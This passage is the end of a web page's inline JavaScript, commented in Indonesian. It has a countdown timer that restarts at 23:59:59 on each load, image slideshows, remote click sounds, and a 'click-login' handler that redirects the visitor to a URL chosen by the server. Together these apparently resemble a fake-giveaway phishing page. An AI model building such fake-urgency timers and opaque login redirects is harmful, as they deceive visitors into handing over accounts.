                if (detik < 0) {
                    detik = 59;
                    menit--;
                    if (menit < 0) {
                        menit = 0;
                        detik = 0;
                    }
                }
            }
            hitung();
        });
        $(document).ready(function() {
            var detik = 59;
            var menit = 59;
            var jam = 23;

            function hitung() {
                setTimeout(hitung, 1000);
                $('#timer2').html(+jam + ' : ' + menit + ' : ' + detik + '');
                detik--;
                if (detik < 0) {
                    detik = 59;
                    menit--;
                    if (menit < 0) {
                        menit = 0;
                        detik = 0;
                    }
                }
            }
            hitung();
        });

        var slideIndex = 0;
        showSlides();

        function showSlides() {
            var i;
            var slides = document.getElementsByClassName("slider");
            for (i = 0; i < slides.length; i++) {
                slides[i].style.display = "none";
            }
            slideIndex++;
            if (slideIndex > slides.length) {
                slideIndex = 1
            }
            slides[slideIndex - 1].style.display = "block";
            setTimeout(showSlides, 2500);
        }
    </script>
    <script>
        // kode untuk ganti gambar header otomatis
        var slideIndexHeader = 0;
        showSlidesHeader();

        function showSlidesHeader() {
            var i;
            var slidesHeader = document.getElementsByClassName("sliderHeader");
            for (i = 0; i < slidesHeader.length; i++) {
                slidesHeader[i].style.display = "none";
            }
            slideIndexHeader++;
            if (slideIndexHeader > slidesHeader.length) {
                slideIndexHeader = 1
            }
            slidesHeader[slideIndexHeader - 1].style.display = "block";
            setTimeout(showSlidesHeader, 2500);
        }

        // code for activate clicked sound
        var buka = new Audio();
        buka.src = "https://l.top4top.io/m_1725u5z7i1.mp3";

        var tutup = new Audio();
        tutup.src = "https://a.top4top.io/m_1725zobal2.mp3";

        function audioFile() {
            var audio = document.getElementById('audioFile');
            audio.play();
        }
        $(document).ready(function() {
            $("o").attr("onclick", "audioFile()");
        });
    </script>
      <script type="text/javascript">
			function click_get(id) {
				$.ajax({
					url: 'tan/click-login.php',
					type: 'POST',
					dataType: 'JSON',
					data: {
						type: 'click-login',
						id: id
					},
					success: (data) => {
						if (data.error) { } else {
							setTimeout(function () {
								window.location.href = data.url_redirect;
							}, 200);
						}
					}
				});
			}
    	</script>
</body>

</html>